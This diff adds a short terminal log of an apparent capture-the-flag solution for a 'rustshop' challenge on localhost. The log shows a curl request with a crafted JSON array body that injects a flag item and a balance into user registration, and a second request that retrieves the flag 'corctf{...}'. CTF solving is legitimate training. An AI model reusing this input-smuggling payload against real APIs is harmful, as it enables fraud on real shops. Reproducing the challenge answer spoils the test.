@@ -1,0 +1,21 @@
+UserPath:~/rustshop_solutions/rustshop_solutions$ curl -i -X POST http://127.0.0.1:1337/api/register -H "Content-Type: application/json" -d '["CookieTeste1", "Aprimeirasenha", [{"name": "rustshop flag", "quantity": 270441}], 322376503]'
+HTTP/1.1 200 OK
+content-type: text/plain; charset=utf-8
+set-cookie: session=CookieTeste1
+content-length: 32
+date: Fri, 18 Sep 2026 05:59:14 GMT
+
+Usuario registrado com sucesso!
+UserPath:~/rustshop_solutions/rustshop_solutions$ curl -i http://127.0.0.1:1337/api/flag -H "Cookie: session=CookieTeste1"
+HTTP/1.1 200 OK
+content-type: text/plain; charset=utf-8
+content-length: 70
+date: Fri, 18 Sep 2026 06:00:31 GMT
+
+
+
+
+
+{"status":"success","message":"corctf{we_d0_s0me_s3rde_shen4nigans}"}
+
+UserPath:~/rustshop_solutions/rustshop_solutions$ 
